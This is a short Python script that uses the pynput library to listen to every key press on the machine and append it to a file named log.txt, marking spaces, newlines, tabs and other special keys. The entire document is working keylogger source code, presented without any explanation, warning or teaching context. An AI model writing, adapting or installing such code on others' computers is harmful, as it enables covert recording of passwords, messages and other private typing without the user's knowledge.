from pynput.keyboard import Listener, Key

def writetofile(key):
    try:
        letter = key.char
        with open('log.txt', 'a') as f:
            f.write(letter)
    except AttributeError:
        with open('log.txt', 'a') as f:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.tab:
                f.write('\t')
            else:
                f.write(f'[{key.name}]')

with Listener(on_press=writetofile) as l:
    l.join()
